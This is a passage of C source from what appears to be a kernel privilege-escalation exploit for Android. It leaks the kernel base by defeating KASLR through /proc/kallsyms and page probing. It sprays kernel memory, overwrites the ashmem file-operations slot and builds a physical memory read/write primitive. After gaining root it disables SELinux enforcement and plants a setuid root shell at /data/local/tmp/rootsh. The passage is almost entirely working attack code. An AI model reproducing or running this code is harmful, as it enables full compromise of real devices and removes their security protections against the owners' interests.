    pr_info("slide paint-main done: arming resident, quiet-spin for fire\n");
    unsigned long spins = 0;
    while (!atomic_load(&slide_fire_done) &&
           !atomic_load(&slide_consume_stop) && spins < 40000000UL) {
      __asm__ volatile("yield" ::: "memory");
      spins++;
    }
    pr_info("slide paint-main quiet-spin exit spins=%lu fire_done=%d\n", spins,
            (int)atomic_load(&slide_fire_done));
  }

  {
    long kill_delay_ms =
        env_int_range("SLIDE_ARM_KILL_DELAY_MS", 20000, 0, 120000);
    if (kill_delay_ms > 0) {
      int fire_wait_ms = 0;
      int need_peek = 0;
      const char *peek_tgt = slide_active_target();
      if (peek_tgt && !strcmp(peek_tgt, "fops")) {
        need_peek = 1;
      }
      if (env_flag("SLIDE_RECLAIM_SPRAY", 1)) {
        util_reclaim_payload_spray();
      }
      slide_dump_fd();
      if (env_flag("SLIDE_V143_HYGIENE", 1)) {
        if (pipe2(slide_v143_cmd_fd, O_CLOEXEC) != 0) {
          pr_warning("v143 H-B pipe2(cmd) failed errno=%d - hygiene "
                     "falls back to the no-channel path\n",
                     errno);
        }
        if (pipe2(slide_v143_ack_fd, O_CLOEXEC) != 0) {
          pr_warning("v143 H-B pipe2(ack) failed errno=%d - ack write "
                     "will EBADF\n",
                     errno);
        }
      }
      int peek_ok = !need_peek || payload_peek_fd() >= 0;
      if (peek_ok) {
        pid_t reaper = SYSCHK(fork());
        if (reaper == 0) {
          slide_reaper_run();
        }
        reaper_note("pre-fire forked reaper pid=%d delay_ms=%ld", (int)reaper,
                    (long)kill_delay_ms);
        pr_info("slide pre-fire forked reaper pid=%d delay_ms=%ld\n", reaper,
                kill_delay_ms);
      }
      while (fire_wait_ms < 25000 && !atomic_load(&slide_fire_done) &&
             !atomic_load(&slide_consume_stop)) {
        usleep(20000);
        fire_wait_ms += 20;
      }
      if (!slide_round_win) {
        if (need_peek && !peek_ok) {
          pr_warning("slide reaper skipped: fops round, peek fd never "
                     "established (waiter hung?) - miss-park, no fork\n");
          slide_park_sleep();
        }
        pr_info("slide main v47 painted: freezing (reaper owns endgame)\n");
        unsigned long spin_budget =
            ((unsigned long)env_int_range("SLIDE_WAIT_SECONDS",
                                          SLIDE_WAIT_SECONDS, 1, 120) +
             1UL) *
            20000000UL;
        unsigned long spin_done = 0;
        for (;;) {
          __asm__ volatile("yield" ::: "memory");
          if (slide_round_win || atomic_load(&slide_consume_stop) ||
              ++spin_done >= spin_budget) {
            break;
          }
        }
        if (!slide_round_win) {
          pr_warning("slide main poll timeout -> park\n");
          slide_park_sleep();
        }
      }
      pr_info("slide v47 win in-round: legacy endgame (v89 pre-fire reaper "
              "self-resolves: A no-kill park, B chains on arm signature)\n");
    }
  }

  {
    pr_info("slide poll-begin pid=%d tgt=%s\n", getpid(),
            slide_active_target() ? slide_active_target() : "(null)");
    int won = 0;
    for (int polln = 0; polln < 100 && !won; polln++) {
      usleep(200000);
      if ((polln % 10) == 0) {
        slide_leak_readback_report();
      }
      if (slide_win_detected()) {
        won = 1;
      }
    }
    slide_dump_walk_state("poll-end");
    pr_info("slide poll-end won=%d pid=%d\n", won, getpid());
    if (won) {
      slide_round_win = 1;
      atomic_store(&slide_consume_stop, 1);
      if (env_flag("SLIDE_V143_PARK_GATE", 1)) {
        int gtid = (int)atomic_load(&slide_owner_tid);
        char gst = '?';
        char gwc[80];
        int ghits = 0;
        for (int gk = 0; gk < 80 && ghits < 2; gk++) {
          slide_owner_state_sample(gtid, &gst, gwc, sizeof(gwc));
          if (gst == 'S' && strstr(gwc, "futex") != NULL) {
            ghits++;
          } else {
            ghits = 0;
          }
          usleep(25000);
        }
        if (ghits >= 2) {
          slide_v143_gate_open = 1;
          pr_info("v143b owner parked: gate open (state=%c wchan=%s)\n", gst,
                  gwc);
        } else {
          pr_warning("v143b owner NOT parked in 2s (state=%c wchan=%s) "
                     "-> gate stays closed\n",
                     gst, gwc);
        }
      }
      slide_probe("main-win");
      pr_success("[!] slide main poll WIN\n");
      if (fake_fops) {
        if (util_fops_armed() && !util_frame_guard(slide_dump_cached_fd)) {
          pr_warning("v113 stage2 child: frame-foreign -> park "
                     "(no openat)\n");
          slide_park_sleep();
        }
        int vfd = open_ashmem_device();
        if (vfd >= 0) {
          unsigned char vbuf[16];
          memset(vbuf, 0xAA, sizeof(vbuf));
          errno = 0;
          ssize_t vrd = pread(vfd, vbuf, sizeof(vbuf), 0);
          pr_warning("slide stage2 hijack probe rd=%zd b0=%02x\n", vrd,
                     vrd > 0 ? vbuf[0] : 0);
          if (vrd == (ssize_t)sizeof(vbuf) && vbuf[0] != 0) {
            slide_v114_repair_llseek(vfd, "child");
            int fr = slide_full_root(vfd);
            pr_success("slide stage2 fullroot ret=%d uid=%d\n", fr,
                       (int)getuid());
            if (fr == 0) {
              slide_probe("stage2-root");
              uint64_t zero = 0;
              configfs_write_once(vfd, SLIDE_SELINUX_STATE, &zero, 1);
              pid_t rsh = fork();
              if (rsh == 0) {
                execl("/system/bin/sh", "sh", "-c",
                      "id > /data/local/tmp/root_proof 2>&1;"
                      "cp /system/bin/sh /data/local/tmp/rootsh;"
                      "chown 0:0 /data/local/tmp/rootsh;"
                      "chmod 6755 /data/local/tmp/rootsh;"
                      "echo done >> /data/local/tmp/root_proof",
                      (char *)NULL);
                _exit(127);
              }
            }
          }
          close(vfd);
        }
      }

      if (getenv("SLIDE_TEXT_ADDR")) {
        if (pipebuf_page_base == 0) {
          pipebuf_page_base = prepare_pipe_buffer_page();
        }
        char pb[64];
        snprintf(pb, sizeof(pb), "pipe-prep base=%llx",
                 (unsigned long long)pipebuf_page_base);
        slide_probe(pb);
      }
      if (pipebuf_page_base != 0 && getenv("SLIDE_TEXT_ADDR")) {
        if (util_fops_armed() && !util_frame_guard(slide_dump_cached_fd)) {
          pr_warning("v113 child-chain: frame-foreign -> park "
                     "(no openat)\n");
          slide_park_sleep();
        }
        int cfd = open_ashmem_device();
        if (cfd >= 0) {
          if (install_pipe_physrw(cfd)) {
            if (kaslr_done) {
              pr_success("slide child chain entry\n");
              run_poison_chain();
            }
            {
              uint64_t orig_fops_ok = ASHMEM_FOPS_STRUCT;
              ssize_t vwr_ok =
                  configfs_write_once(cfd, ASHMEM_MISC_FOPS_SLOT, &orig_fops_ok,
                                      sizeof(orig_fops_ok));
              slide_probe("chain:slot-restored");
              pr_info("slide child post-chain slot restore=%zd\n", vwr_ok);
            }
          } else {
            uint64_t orig_fops = ASHMEM_FOPS_STRUCT;
            ssize_t vwr = configfs_write_once(cfd, ASHMEM_MISC_FOPS_SLOT,
                                              &orig_fops, sizeof(orig_fops));
            pr_warning("slide child install_pipe_physrw failed "
                       "slot_restore=%zd\n",
                       vwr);
          }
          close(cfd);
        }
      } else {
        pr_warning("slide child pipe page prepare failed\n");
      }
    } else {
      if (env_flag("SLIDE_V143_PARK_GATE", 1) && !slide_v143_gate_open) {
        slide_v143_gate_open = 1;
        pr_info("v143b gate open (miss verdict)\n");
      }
      slide_probe("main-miss-chain-attempt");
      if (getenv("SLIDE_TEXT_ADDR")) {
      }
      pr_warning("slide main poll miss: parking (no exit, no teardown)\n");
    }
    pr_success("slide main park: freezing\n");
    slide_leak_readback_report();
    slide_park_sleep();
  }

  return slide_read_stext();
}

static void slide_inject_kaslr_from_kallsyms(void) {
  if (kaslr_done) {
    return;
  }
  int fd = open("/proc/kallsyms", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide kallsyms open failed errno=%d\n", errno);
    return;
  }
  char buf[4096];
  ssize_t n;
  uint64_t text_addr = 0;
  size_t carry = 0;
  while ((n = read(fd, buf + carry, sizeof(buf) - 1 - carry)) > 0 &&
         !text_addr) {
    buf[carry + n] = 0;
    char *line = buf;
    char *nl;
    while ((nl = strchr(line, '\n')) != NULL) {
      *nl = 0;
      uint64_t a = strtoull(line, NULL, 16);
      char *sp = strchr(line, ' ');
      if (a && sp && strstr(sp, " _text") != NULL) {
        text_addr = a;
        break;
      }
      line = nl + 1;
    }
    carry = strlen(line);
    memmove(buf, line, carry);
  }
  close(fd);
  if (!text_addr) {
    pr_warning("slide kallsyms _text not found\n");
    return;
  }
  kaslr_base = text_addr;
  kaslr_done = 1;
  pr_success("slide kaslr injected _text=%016llx\n",
             (unsigned long long)text_addr);
}

static void slide_poolscan_zone_log(const char *when) {
  static char buf[65536];
  int fd = open("/proc/zoneinfo", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("v154 scan %s zoneinfo open errno=%d\n", when, errno);
    return;
  }
  ssize_t total = 0;
  while (total < (ssize_t)sizeof(buf) - 1) {
    ssize_t n = read(fd, buf + total, sizeof(buf) - 1 - (size_t)total);
    if (n <= 0) {
      break;
    }
    total += n;
  }
  close(fd);
  buf[total] = 0;
  char zname[48] = "?";
  unsigned long zfree = 0, zmin = 0, zlow = 0, zhigh = 0, zpresent = 0;
  int have = 0;
  char *save = NULL;
  for (char *line = strtok_r(buf, "\n", &save); line != NULL;
       line = strtok_r(NULL, "\n", &save)) {
    if (strncmp(line, "Node", 4) == 0 && strstr(line, "zone") != NULL) {
      if (have) {
        pr_info("v154 scan %s zone=%s free=%lu min=%lu low=%lu high=%lu "
                "present=%lu\n",
                when, zname, zfree, zmin, zlow, zhigh, zpresent);
      }
      have = 0;
      zfree = zmin = zlow = zhigh = zpresent = 0;
      char *z = strstr(line, "zone");
      sscanf(z + 4, "%47s", zname);
      continue;
    }
    const char *t = line;
    while (*t == ' ') {
      t++;
    }
    unsigned long v = 0;
    if (strncmp(t, "pages free", 10) == 0 && sscanf(t + 10, "%lu", &v) == 1) {
      zfree = v;
      have = 1;
    } else if (strncmp(t, "min", 3) == 0 && sscanf(t + 3, "%lu", &v) == 1) {
      zmin = v;
    } else if (strncmp(t, "low", 3) == 0 && sscanf(t + 3, "%lu", &v) == 1) {
      zlow = v;
    } else if (strncmp(t, "high", 4) == 0 && sscanf(t + 4, "%lu", &v) == 1) {
      zhigh = v;
    } else if (strncmp(t, "present", 7) == 0 && sscanf(t + 7, "%lu", &v) == 1) {
      zpresent = v;
    }
  }
  if (have) {
    pr_info("v154 scan %s zone=%s free=%lu min=%lu low=%lu high=%lu "
            "present=%lu\n",
            when, zname, zfree, zmin, zlow, zhigh, zpresent);
  }
  fd = open("/proc/buddyinfo", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    static char bb[4096];
    ssize_t n = read(fd, bb, sizeof(bb) - 1);
    close(fd);
    if (n > 0) {
      bb[n] = 0;
      save = NULL;
      for (char *line = strtok_r(bb, "\n", &save); line != NULL;
           line = strtok_r(NULL, "\n", &save)) {
        pr_info("v154 scan %s buddyinfo %s\n", when, line);
      }
    }
  }
}

static void slide_poolscan_run(int draws) {
  uint64_t glk = slide_lock_addr();
  uint64_t lcap = (uint64_t)env_int_range("SLIDE_V144_LGATE_MB", 600, 50, 8000);
  int ok = 0, fail = 0, inband = 0;
  uint64_t dmin = ~0ULL, dmax = 0;
  pr_warning("v154 poolscan BEGIN draws=%d glk=%016llx cap=%lluMB "
             "(no arm, no kill, no slot touch)\n",
             draws, (unsigned long long)glk, (unsigned long long)lcap);
  setenv("SLIDE_PAGE_HOLD_SKB", "1", 1);
  slide_poolscan_zone_log("t0");
  for (int k = 1; k <= draws; k++) {
    uintptr_t base = prepare_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!base) {
      fail++;
      pr_warning("v154 poolscan draw=%d/%d FAIL base=0\n", k, draws);
      continue;
    }
    ok++;
    uint64_t la = (uint64_t)base, lb = glk;
    uint64_t dist = la > lb ? la - lb : lb - la;
    uint64_t dmb = dist / (1024ULL * 1024ULL);
    if (dmb < dmin) {
      dmin = dmb;
    }
    if (dmb > dmax) {
      dmax = dmb;
    }
    if (dmb <= lcap) {
      inband++;
    }
    int inlin = (la >= 0xffffff8000000000ULL && la < 0xffffffc000000000ULL);
    uint64_t physmb =
        inlin ? (la - 0xffffff8000000000ULL) / (1024ULL * 1024ULL) : 0;
    pr_info("v154 poolscan draw=%d/%d base=%016llx %sphys=%lluMiB "
            "dist=%lluMB %s\n",
            k, draws, (unsigned long long)la, inlin ? "" : "(nonlinear)",
            (unsigned long long)physmb, (unsigned long long)dmb,
            dmb <= lcap ? "INBAND" : "out");
  }
  slide_poolscan_zone_log("tend");
  pr_warning("v154 poolscan SUMMARY draws=%d ok=%d fail=%d inband=%d "
             "distmin=%lluMB distmax=%lluMB\n",
             draws, ok, fail, inband, (unsigned long long)(ok ? dmin : 0),
             (unsigned long long)dmax);
  fflush(stdout);
}

int slide_leak_kernel_base(void) {
  int v154_draws = env_int_range("SLIDE_POOLSCAN", 0, 0, 64);
  if (v154_draws > 0) {
    slide_poolscan_run(v154_draws);
    pr_warning("v154 poolscan exit-0 (diagnostic round, no fire)\n");
    fflush(stdout);
    _exit(0);
  }
  for (int attempt = 1, attempt_max = slide_max_attempts();
       attempt <= attempt_max; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    pr_info("slide leak-attempt %d/%d page_base=%016llx fake_lock=%016llx\n",
            attempt, attempt_max, (unsigned long long)page_base,
            (unsigned long long)fake_lock);
    if (!page_base || !fake_lock) {
      continue;
    }
    {
      const char *v155_tgt = slide_active_target();
      int v155_max = env_int_range("SLIDE_V155_RESAMPLE", 0, 0, 24);
      if (v155_max > 0 && v155_tgt && !strcmp(v155_tgt, "fops")) {
        setenv("SLIDE_PAGE_HOLD_SKB", "1", 1);
        uint64_t v155_cap =
            (uint64_t)env_int_range("SLIDE_V144_LGATE_MB", 600, 50, 8000);
        int v155_ok = 0, v155_cyc = 0, v155_cyc_cap = v155_max + 4;
        int v155_pass = 0;
        for (;;) {
          if (page_base && fake_lock) {
            v155_ok++;
            uint64_t v155_glk = slide_lock_addr();
            uint64_t v155_la = (uint64_t)page_base + 0x300ULL;
            uint64_t v155_d =
                v155_la > v155_glk ? v155_la - v155_glk : v155_glk - v155_la;
            uint64_t v155_mb = v155_d / (1024ULL * 1024ULL);
            if (v155_mb <= v155_cap) {
              v155_pass = 1;
              pr_warning(
                  "v155 L-pre-gate PASS ok=%d/%d cyc=%d frame=%016llx "
                  "dist=%lluMB cap=%lluMB -> proceed to arm\n",
                  v155_ok, v155_max, v155_cyc, (unsigned long long)v155_la,
                  (unsigned long long)v155_mb, (unsigned long long)v155_cap);
              break;
            }
            pr_warning("v155 L-pre-gate out ok=%d/%d cyc=%d frame=%016llx "
                       "dist=%lluMB > cap=%lluMB -> page held, resample\n",
                       v155_ok, v155_max, v155_cyc, (unsigned long long)v155_la,
                       (unsigned long long)v155_mb,
                       (unsigned long long)v155_cap);
          } else {
            pr_warning("v155 L-pre-gate draw FAIL ok=%d/%d cyc=%d base=0 "
                       "-> re-leak\n",
                       v155_ok, v155_max, v155_cyc);
          }
          v155_cyc++;
          if (v155_ok >= v155_max || v155_cyc >= v155_cyc_cap) {
            break;
          }
          page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
        }
        if (!v155_pass) {
          pr_warning("v155 L-pre-gate exhausted ok=%d cyc=%d -> park exit-0 "
                     "(never armed, never killed, slot untouched)\n",
                     v155_ok, v155_cyc);
          fflush(stdout);
          _exit(0);
        }
      }
    }

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    pr_info("slide forked flow-child pid=%d\n", child);
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        if (env_flag("SLIDE_HOLD_AFTER", 0)) {
          pr_warning("slide hold-after success: sleeping forever\n");
          for (;;) {
            sleep(3600);
          }
        }
        pr_warning("slide child-exit-0 win-path stext=%016llx\n",
                   (unsigned long long)stext);
        _exit(0);
      }
      pr_warning("slide leak failed raw_bootid_dump next\n");
      {
        uint64_t leaked = 0;
        char buf[64];
        int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
        ssize_t n = fd >= 0 ? read(fd, buf, sizeof(buf) - 1) : -1;
        if (n > 0) {
          buf[n] = 0;
          pr_warning("slide post boot_id=%s", buf);
        }
        if (fd >= 0) {
          close(fd);
        }
        (void)leaked;
      }
      if (env_flag("SLIDE_HOLD_AFTER", 1)) {
        pr_warning("slide hold-after fail: sleeping 600s before exit\n");
        sleep(600);
      }
      pr_warning("slide child-exit-1 miss-path hold=%d\n",
                 env_flag("SLIDE_HOLD_AFTER", 1));
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    int leak_read_errno = n < 0 ? errno : 0;
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    int exited = WIFEXITED(status);
    int exitcode = exited ? WEXITSTATUS(status) : -1;
    int termsig = !exited ? WTERMSIG(status) : -1;
    if (n != (ssize_t)sizeof(stext) || !exited || exitcode != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd errno=%d status=%d "
                 "exited=%d exitcode=%d termsig=%d\n",
                 attempt, n, leak_read_errno, status, exited, exitcode,
                 termsig);
      slide_inject_kaslr_from_kallsyms();
      continue;
    }

    if (env_flag("SLIDE_TEXT_ADDR", 0)) {
      util_mark_fops_armed("parent-child-win");
      return 1;
    }
    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n", getpid(),
               (unsigned long long)kaslr_base, (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
